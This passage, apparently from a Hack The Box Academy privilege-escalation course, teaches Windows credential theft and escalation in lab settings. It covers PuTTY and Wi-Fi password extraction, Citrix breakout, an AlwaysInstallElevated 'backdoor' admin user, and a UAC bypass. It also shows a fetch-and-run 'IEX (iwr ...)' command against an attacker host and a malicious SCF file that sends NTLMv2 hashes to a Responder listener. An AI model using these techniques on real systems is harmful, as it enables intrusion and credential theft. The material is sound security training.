<pre><code class="lang-cmd">Computer<span class="hljs-symbol">\H</span>KEY_CURRENT_USER<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\S</span>imonTatham<span class="hljs-symbol">\P</span>uTTY<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\&lt;</span>SESSION NAME&gt;
</code></pre>
<p>Note that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the <code>HKEY_CURRENT_USER</code> hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user&#39;s hive in <code>HKEY_USERS</code>.</p>
<p><strong>Enumerating Sessions and Finding Credentials:</strong></p>
<p>First, we need to enumerate the available saved sessions:</p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; reg query HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\S</span>imonTatham<span class="hljs-symbol">\P</span>uTTY<span class="hljs-symbol">\S</span>essions

HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\S</span>imonTatham<span class="hljs-symbol">\P</span>uTTY<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\k</span>ali<span class="hljs-variable">%20ssh</span>
</code></pre>
<p>Next, we look at the keys and values of the discovered session &quot;<code>kali%20ssh</code>&quot;:</p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; reg query HKEY_CURRENT_USER<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">SimonTatham</span></span><span class="hljs-tag">\<span class="hljs-name">PuTTY</span></span><span class="hljs-tag">\<span class="hljs-name">Sessions</span></span><span class="hljs-tag">\<span class="hljs-name">kali</span></span><span class="hljs-comment">%20ssh</span>

HKEY_CURRENT_USER<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">SimonTatham</span></span><span class="hljs-tag">\<span class="hljs-name">PuTTY</span></span><span class="hljs-tag">\<span class="hljs-name">Sessions</span></span><span class="hljs-tag">\<span class="hljs-name">kali</span></span><span class="hljs-comment">%20ssh</span>
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log

  &lt;SNIP&gt;

    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
</code></pre>
<p>In this example, we can imagine the scenario that the IT administrator has configured Putty for a user in their environment, but unfortunately used their admin credentials in the proxy connection. The password could be extracted and potentially reused across the network.</p>
<p>For additional information on <code>reg.exe</code> and working with the registry, be sure to check out the <a href="https://academy.hackthebox.com/module/167/section/1623">Introduction to Windows Command Line</a> module.</p>
<hr>
<h3 id="wifi-passwords">Wifi Passwords</h3>
<p><strong>Viewing Saved Wireless Networks</strong></p>
<p>If we obtain local admin access to a user&#39;s workstation with a wireless card, we can list out any wireless networks they have recently connected to.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-cmd-session">C:\htb&gt; netsh wlan show profile

Profiles on interface Wi-Fi:

<span class="hljs-keyword">Group</span> <span class="hljs-title">policy</span> profiles (<span class="hljs-keyword">read</span> only)
---------------------------------
    <span class="hljs-tag">&lt;None&gt;</span>

<span class="hljs-keyword">User</span> <span class="hljs-title">profiles</span>
-------------
    All <span class="hljs-keyword">User</span> <span class="hljs-title">Profile</span>     : Smith Cabin
    All <span class="hljs-keyword">User</span> <span class="hljs-title">Profile</span>     : Bob's iPhone
    All <span class="hljs-keyword">User</span> <span class="hljs-title">Profile</span>     : EE_Guest
    All <span class="hljs-keyword">User</span> <span class="hljs-title">Profile</span>     : EE_Guest <span class="hljs-number">2.4</span>
    All <span class="hljs-keyword">User</span> <span class="hljs-title">Profile</span>     : ilfreight_corp
</code></pre>
<p><strong>Retrieving Saved Wireless Passwords</strong></p>
<p>Depending on the network configuration, we can retrieve the pre-shared key (<code>Key Content</code> below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-cmd-session">C:\htb&gt; netsh wlan show profile ilfreight<span class="hljs-emphasis">_corp key=clear

</span><span class="hljs-section">Profile ilfreight_corp on interface Wi-Fi:
=======================================================================</span>

Applied: All User Profile

<span class="hljs-section">Profile information
-------------------</span>
<span class="hljs-code">    Version                : 1</span>
<span class="hljs-code">    Type                   : Wireless LAN</span>
<span class="hljs-code">    Name                   : ilfreight_corp</span>
<span class="hljs-code">    Control options        :</span>
<span class="hljs-code">        Connection mode    : Connect automatically</span>
<span class="hljs-code">        Network broadcast  : Connect only if this network is broadcasting</span>
<span class="hljs-code">        AutoSwitch         : Do not switch to other networks</span>
<span class="hljs-code">        MAC Randomization  : Disabled</span>

<span class="hljs-section">Connectivity settings
---------------------</span>
<span class="hljs-code">    Number of SSIDs        : 1</span>
<span class="hljs-code">    SSID name              : "ilfreight_corp"</span>
<span class="hljs-code">    Network type           : Infrastructure</span>
<span class="hljs-code">    Radio type             : [ Any Radio Type ]</span>
<span class="hljs-code">    Vendor extension          : Not present</span>

<span class="hljs-section">Security settings
-----------------</span>
<span class="hljs-code">    Authentication         : WPA2-Personal</span>
<span class="hljs-code">    Cipher                 : CCMP</span>
<span class="hljs-code">    Authentication         : WPA2-Personal</span>
<span class="hljs-code">    Cipher                 : GCMP</span>
<span class="hljs-code">    Security key           : Present</span>
<span class="hljs-code">    Key Content            : ILFREIGHTWIFI-CORP123908!</span>

<span class="hljs-section">Cost settings
-------------</span>
<span class="hljs-code">    Cost                   : Unrestricted</span>
<span class="hljs-code">    Congested              : No</span>
<span class="hljs-code">    Approaching Data Limit : No</span>
<span class="hljs-code">    Over Data Limit        : No</span>
<span class="hljs-code">    Roaming                : No</span>
<span class="hljs-code">    Cost Source            : Default</span>
</code></pre>
<h2 id="citrix-breakout">Citrix Breakout</h2>
<hr>
<p>Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However, in most organizations &quot;lock-down&quot; measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to &quot;break-out&quot; of the restricted environment.</p>
<hr>
<p>Basic Methodology for break-out:</p>
<ol>
<li>Gain access to a <code>Dialog Box</code>.</li>
<li>Exploit the Dialog Box to achieve <code>command execution</code>.</li>
<li><code>Escalate privileges</code> to gain higher levels of access.</li>
</ol>
<hr>
<p>In certain environments, where minimal hardening measures are implemented, there might even be a standard shortcut to <code>cmd.exe</code> in the Start Menu, potentially aiding in unauthorized access. However, in a highly restrictive <code>lock-down</code> environment, any attempts to locate &quot;cmd.exe&quot; or &quot;powershell.exe&quot; in the start menu will yield no results. Similarly, accessing <code>C:\Windows\system32</code> through File Explorer will trigger an error, preventing direct access to critical system utilities. Acquiring access to the &quot;CMD/Command Prompt&quot; in such a restricted environment represents a notable achievement, as it provides extensive control over the Operating System. This level of control empowers an attacker to gather valuable information, facilitating the further escalation of privileges.</p>
<p>There are many techniques which can be used for breaking out of a Citrix environment. This section will not cover every possible scenario, but we will walk through the most common ways to perform a Citrix breakout.</p>
<p>Visit <a href="http://humongousretail.com/remote/">http://humongousretail.com/remote/</a> using the RDP session of the spawned target and login with the provided credentials below. After login, click on the <code>Default Desktop</code> to obtain the Citrix <code>launch.ica</code> file in order to connect to the restricted environment.</p>
<p>Code: citrixcredentials</p>
<pre><code class="lang-citrixcredentials"><span class="hljs-symbol">Username:</span> pmorgan
<span class="hljs-symbol">Password:</span> Summer1Summer!
<span class="hljs-symbol">  Domain:</span> htb.local
</code></pre>
<hr>
<h3 id="bypassing-path-restrictions">Bypassing Path Restrictions</h3>
<p>When we attempt to visit <code>C:\Users</code> using File Explorer, we find it is restricted and results in an error. This indicates that group policy has been implemented to restrict users from browsing directories in the <code>C:\</code> drive using File Explorer. In such scenarios, it is possible to utilize windows dialog boxes as a means to bypass the restrictions imposed by group policy. Once a Windows dialog box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/C\_users\_restricted.png" alt="Image"></p>
<p>Numerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box. There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc. We will cover using <code>MS Paint</code> as an example for this section.</p>
<p>Run <code>Paint</code> from start menu and click on <code>File &gt; Open</code> to open the Dialog Box.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/paint.png" alt="Image"></p>
<p>With the windows dialog box open for paint, we can enter the <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths">UNC</a> path <code>\\127.0.0.1\c$\users\pmorgan</code> under the File name field, with File-Type set to <code>All Files</code> and upon hitting enter we gain access to the desired directory.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/paint\_flag.png" alt="Image"></p>
<hr>
<h3 id="accessing-smb-share-from-restricted-environment">Accessing SMB share from restricted environment</h3>
<p>Having restrictions set, File Explorer does not allow direct access to SMB shares on attacker machine. However, by utilizing the UNC path within the Windows dialog box, it&#39;s possible to circumvent this limitation. This approach can be employed to facilitate file transfers from a different computer.</p>
<p>Start a SMB server from the attacker machine using Impacket&#39;s <code>smbserver.py</code> script.</p>
<p>Citrix Breakout</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/htb-student/Tools</span><span class="hljs-comment"># smbserver.py -smb2support share $(pwd)</span>

Impacket v<span class="hljs-number">0</span>.<span class="hljs-number">10.0</span> - Copyright <span class="hljs-number">2022</span> SecureAuth Corporation
[*] Config file parsed
[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">4</span>B324FC8-<span class="hljs-number">1670</span>-<span class="hljs-number">01</span>D3-<span class="hljs-number">1278</span>-<span class="hljs-number">5</span>A47BF6EE188 <span class="hljs-symbol">V:</span><span class="hljs-number">3.0</span>
[*] Callback added <span class="hljs-keyword">for</span> UUID <span class="hljs-number">6</span>BFFD098-A112-<span class="hljs-number">3610</span>-<span class="hljs-number">9833</span>-<span class="hljs-number">46</span>C3F87E345A <span class="hljs-symbol">V:</span><span class="hljs-number">1.0</span>
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>
<p>Back in the Citrix environment, initiate the &quot;Paint&quot; application via the start menu. Proceed to navigate to the &quot;File&quot; menu and select &quot;Open&quot;, thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as <code>\\10.13.38.95\share</code> into the designated &quot;File name&quot; field. Ensure that the File-Type parameter is configured to &quot;All Files.&quot; Upon pressing the &quot;Enter&quot; key, entry into the share is achieved.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/paint\_share.png" alt="Image"></p>
<p>Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves <code>right-clicking</code> on the executables and subsequently launching them. Right-click on the <code>pwn.exe</code> binary and select <code>Open</code>, which should prompt us to run it and a cmd console will be opened.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/pwn\_cmd.png" alt="Image"></p>
<p>The executable <code>pwn.exe</code> is a custom compiled binary from <code>pwn.c</code> file which upon execution opens up the cmd.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
  system(<span class="hljs-string">"C:\\Windows\\System32\\cmd.exe"</span>);
}
</code></pre>
<p>We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/xcopy.png" alt="Image"></p>
<hr>
<h3 id="alternate-explorer">Alternate Explorer</h3>
<p>In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like <code>Q-Dir</code> or <code>Explorer++</code> can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.</p>
<p>It&#39;s worth noting the previous inability of File Explorer to copy files from the SMB share due to restrictions in place. However, through the utilization of <code>Explorer++</code>, the capability to copy files from the <code>\\10.13.38.95\share</code> location to the Desktop belonging to the user <code>pmorgan</code> has been successfully demonstrated in following screenshot.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/Explorer++.png" alt="Image"></p>
<p><a href="https://explorerplusplus.com/">Explorer++</a> is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.</p>
<hr>
<h3 id="alternate-registry-editors">Alternate Registry Editors</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/67/smallregistry.png" alt="Image"></p>
<p>Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. <a href="https://sourceforge.net/projects/simpregedit/">Simpleregedit</a>, <a href="https://sourceforge.net/projects/uberregedit/">Uberregedit</a> and <a href="https://sourceforge.net/projects/sre/">SmallRegistryEditor</a> are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.</p>
<hr>
<h3 id="modify-existing-shortcut-file">Modify existing shortcut file</h3>
<p>Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable&#39;s path in the <code>Target</code> field.</p>
<p>The following steps outline the process:</p>
<ol>
<li><code>Right-click</code> the desired shortcut.</li>
<li>Select <code>Properties</code>. <img src="https://academy.hackthebox.com/storage/modules/67/shortcut\_1.png" alt="Image"></li>
<li>Within the <code>Target</code> field, modify the path to the intended folder for access. <img src="https://academy.hackthebox.com/storage/modules/67/shortcut\_2.png" alt="Image"></li>
<li>Execute the Shortcut and cmd will be spawned <img src="https://academy.hackthebox.com/storage/modules/67/shortcut\_3.png" alt="Image"></li>
</ol>
<p>In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under <a href="https://academy.hackthebox.com/module/67/section/630">Interacting with Users section</a> under <code>Generating a Malicious .lnk File</code> tab. These approaches provide versatility in achieving our objectives while working with shortcut files.</p>
<hr>
<h3 id="script-execution">Script Execution</h3>
<p>When script extensions such as <code>.bat</code>, <code>.vbs</code>, or <code>.ps</code> are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.</p>
<ol>
<li>Create a new text file and name it &quot;evil.bat&quot;.</li>
<li>Open &quot;evil.bat&quot; with a text editor such as Notepad.</li>
<li>Input the command &quot;cmd&quot; into the file. <img src="https://academy.hackthebox.com/storage/modules/67/script\_bat.png" alt="Image"></li>
<li>Save the file.</li>
</ol>
<p>Upon executing the &quot;evil.bat&quot; file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.</p>
<hr>
<h3 id="escalating-privileges">Escalating Privileges</h3>
<p>Once access to the command prompt is established, it&#39;s possible to search for vulnerabilities in a system more easily. For instance, tools like <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">Winpeas</a> and <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">PowerUp</a> can also be employed to identify potential security issues and vulnerabilities within the operating system.</p>
<p>Using <code>PowerUp.ps1</code>, we find that <a href="https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">Always Install Elevated</a> key is present and set.</p>
<p>We can also validate this using the Command Prompt by querying the corresponding registry keys:</p>
<p>Citrix Breakout</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\&gt;</span> reg query HKCU<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller /v AlwaysInstallElevated

HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller
        AlwaysInstallElevated    REG_DWORD    0x1


C:<span class="hljs-symbol">\&gt;</span> reg query HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller
        AlwaysInstallElevated    REG_DWORD    0x1
</code></pre>
<p>Once more, we can make use of PowerUp, using it&#39;s <code>Write-UserAddMSI</code> function. This function facilitates the creation of an <code>.msi</code> file directly on the desktop.</p>
<p>Citrix Breakout</p>
<pre><code class="lang-powershell-session">PS C:\Users\pmorgan\Desktop&gt; Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop&gt; Write-UserAddMSI

<span class="hljs-section">Output Path
-----------</span>
UserAdd.msi
</code></pre>
<p>Now we can execute <code>UserAdd.msi</code> and create a new user <code>backdoor:T3st@123</code> under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/useradd.png" alt="Image"></p>
<p>Back in CMD execute <code>runas</code> to start command prompt as the newly created <code>backdoor</code> user.</p>
<p>Citrix Breakout</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\&gt; runas /<span class="hljs-attribute">user</span>:backdoor cmd

Enter the password for <span class="hljs-attribute">backdoor</span>: T3st<span class="hljs-variable">@123</span>
Attempting to start cmd as user <span class="hljs-string">"VDESKTOP3\backdoor"</span> ...
</code></pre>
<hr>
<h3 id="bypassing-uac">Bypassing UAC</h3>
<p>Even though the newly established user <code>backdoor</code> is a member of <code>Administrators</code> group, accessing the <code>C:\users\Administrator</code> directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.</p>
<p>Citrix Breakout</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32&gt; cd C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator

Access is denied.
</code></pre>
<p>Numerous <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">UAC bypass</a> scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.</p>
<p>Citrix Breakout</p>
<pre><code class="lang-powershell-session">PS C:\Users\<span class="hljs-keyword">Public</span>&gt; Import-<span class="hljs-keyword">Module</span> .\Bypass-UAC.ps1
PS C:\Users\<span class="hljs-keyword">Public</span>&gt; Bypass-UAC -<span class="hljs-function"><span class="hljs-keyword">Method</span> <span class="hljs-title">UacMethodSysprep</span></span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/67/bypass\_uac.png" alt="Image"></p>
<p>Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command <code>whoami /all</code> or <code>whoami /priv</code>. This command provides a comprehensive view of the current user&#39;s privileges. And we can now access the Administrator directory.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/flag.png" alt="Image"></p>
<p>Note: Wait for 5 minutes after spawning the target. Disregard the licensing message.</p>
<p><strong>Addditional resources worth checking:</strong></p>
<ul>
<li><a href="https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/">Breaking out of Citrix and other Restricted Desktop environments</a></li>
<li><a href="https://node-security.com/posts/breaking-out-of-windows-environments/">Breaking out of Windows Environments</a></li>
</ul>
<h2 id="interacting-with-users">Interacting with Users</h2>
<hr>
<p>Users are sometimes the weakest link in an organization. An overloaded employee working quickly may not notice something is &quot;off&quot; on their machine when browsing a shared drive, clicking on a link, or running a file. As discussed throughout this module, Windows presents us with an enormous attack surface, and there are many things to check for when enumerating local privilege escalation vectors. Once we have exhausted all options, we can look at specific techniques to steal credentials from an unsuspecting user by sniffing their network traffic/local commands or attacking a known vulnerable service requiring user interaction. One of my favorite techniques is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.</p>
<hr>
<h3 id="traffic-capture">Traffic Capture</h3>
<p>If <code>Wireshark</code> is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/pcap.png" alt="image"></p>
<p>Here we can see a rough example of capturing cleartext FTP credentials entered by another user while signed into the same box. While not highly likely, if <code>Wireshark</code> is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/ftp.png" alt="image"></p>
<p>Also, suppose our client positions us on an attack machine within the environment. In that case, it is worth running <code>tcpdump</code> or <code>Wireshark</code> for a while to see what types of traffic are being passed over the wire and if we can see anything interesting. The tool <a href="https://github.com/DanMcInerney/net-creds">net-creds</a> can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.</p>
<hr>
<h3 id="process-command-lines">Process Command Lines</h3>
<p><strong>Monitoring for Process Command Lines</strong></p>
<p>When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">while</span>(<span class="hljs-literal">$true</span>)
{

  <span class="hljs-variable">$process</span> = <span class="hljs-built_in">Get-WmiObject</span> Win32_Process | <span class="hljs-built_in">Select-Object</span> CommandLine
  <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-number">1</span>
  <span class="hljs-variable">$process2</span> = <span class="hljs-built_in">Get-WmiObject</span> Win32_Process | <span class="hljs-built_in">Select-Object</span> CommandLine
  <span class="hljs-built_in">Compare-Object</span> -ReferenceObject <span class="hljs-variable">$process</span> -DifferenceObject <span class="hljs-variable">$process2</span>

}
</code></pre>
<p><strong>Running Monitor Script on Target Host</strong></p>
<p>We can host the script on our attack machine and execute it on the target host as follows.</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\D</span>llHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =&gt;      
@{CommandLine=“C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe” }                          =&gt;      
@{CommandLine=<span class="hljs-symbol">\?</span>?<span class="hljs-symbol">\C</span>:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onhost.exe 0x4}                      =&gt;      
@{CommandLine=net use T: <span class="hljs-symbol">\\</span>sql02<span class="hljs-symbol">\b</span>ackups /user:inlanefreight<span class="hljs-symbol">\s</span>qlsvc My4dm1nP@s5w0Rd}       =&gt;       
@{CommandLine=“C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\b</span>ackgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... &lt;=
</code></pre>
<p>This is successful and reveals the password for the <code>sqlsvc</code> domain user, which we could then possibly use to gain access to the SQL02 host or potentially find sensitive data such as database credentials on the <code>backups</code> share.</p>
<hr>
<h3 id="vulnerable-services">Vulnerable Services</h3>
<p>We may also encounter situations where we land on a host running a vulnerable application that can be used to elevate privileges through user interaction. <a href="https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e">CVE-2019–15752</a> is a great example of this. This was a vulnerability in Docker Desktop Community Edition before 2.1.0.1. When this particular version of Docker starts, it looks for several different files, including <code>docker-credential-wincred.exe</code>, <code>docker-credential-wincred.bat</code>, etc., which do not exist with a Docker installation. The program looks for these files in the <code>C:\PROGRAMDATA\DockerDesktop\version-bin\</code>. This directory was misconfigured to allow full write access to the <code>BUILTIN\Users</code> group, meaning that any authenticated user on the system could write a file into it (such as a malicious executable).</p>
<p>Any executable placed in that directory would run when a) the Docker application starts and b) when a user authenticates using the command <code>docker login</code>. While a bit older, it is not outside the realm of possibility to encounter a developer&#39;s workstation running this version of Docker Desktop, hence why it is always important to thoroughly enumerate installed software. While this particular flaw wouldn&#39;t guarantee us elevated access (since it relies on a service restart or user action), we could plant our executable during a long-term assessment and periodically check if it runs and our privileges are elevated.</p>
<hr>
<h3 id="scf-on-a-file-share">SCF on a File Share</h3>
<p>A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as <a href="https://github.com/lgandx/Responder">Responder</a>, <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>, or <a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a>, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user&#39;s workstation. We may be able to capture a user&#39;s password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.</p>
<p><strong>Malicious SCF File</strong></p>
<p>In this example, let&#39;s create the following file and name it something like <code>@Inventory.scf</code> (similar to another file in the directory, so it does not appear out of place). We put an <code>@</code> at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our <code>tun0</code> IP address and any fake share name and .ico file name.</p>
<pre><code class="lang-shell-session"><span class="hljs-section">[Shell]</span>
<span class="hljs-attr">Command</span>=<span class="hljs-number">2</span>
<span class="hljs-attr">IconFile</span>=\\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span>\share\legit.ico
<span class="hljs-section">[Taskbar]</span>
<span class="hljs-attr">Command</span>=ToggleDesktop
</code></pre>
<p><strong>Starting Responder</strong></p>
<p>Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user&#39;s NTLMV2 password hash in our console and attempt to crack it offline.</p>
<pre><code class="lang-shell-session">[!bash!]$ sudo responder -wrf -v -I tun0
                                         __
  .<span class="hljs-comment">----.-----.-----.-----.-----.-----.--|  |.-----.----.</span>
  |   _|  -__|__ <span class="hljs-comment">--|  _  |  _  |     |  _  ||  -__|   _|</span>
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To <span class="hljs-keyword">kill</span> this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [<span class="hljs-keyword">ON</span>]
    NBT-NS                     [<span class="hljs-keyword">ON</span>]
    DNS/MDNS                   [<span class="hljs-keyword">ON</span>]

[+] Servers:
    <span class="hljs-keyword">HTTP</span> <span class="hljs-keyword">server</span>                [<span class="hljs-keyword">ON</span>]
    HTTPS <span class="hljs-keyword">server</span>               [<span class="hljs-keyword">ON</span>]
    WPAD proxy                 [<span class="hljs-keyword">ON</span>]
    Auth proxy                 [<span class="hljs-keyword">OFF</span>]
    SMB <span class="hljs-keyword">server</span>                 [<span class="hljs-keyword">ON</span>]
    Kerberos <span class="hljs-keyword">server</span>            [<span class="hljs-keyword">ON</span>]
    <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">server</span>                 [<span class="hljs-keyword">ON</span>]
    <span class="hljs-keyword">FTP</span> <span class="hljs-keyword">server</span>                 [<span class="hljs-keyword">ON</span>]
    IMAP <span class="hljs-keyword">server</span>                [<span class="hljs-keyword">ON</span>]
    POP3 <span class="hljs-keyword">server</span>                [<span class="hljs-keyword">ON</span>]
    SMTP <span class="hljs-keyword">server</span>                [<span class="hljs-keyword">ON</span>]
    DNS <span class="hljs-keyword">server</span>                 [<span class="hljs-keyword">ON</span>]
    LDAP <span class="hljs-keyword">server</span>                [<span class="hljs-keyword">ON</span>]
    RDP <span class="hljs-keyword">server</span>                 [<span class="hljs-keyword">ON</span>]

[+] <span class="hljs-keyword">HTTP</span> Options:
    <span class="hljs-keyword">Always</span> serving EXE         [<span class="hljs-keyword">OFF</span>]
    Serving EXE                [<span class="hljs-keyword">OFF</span>]
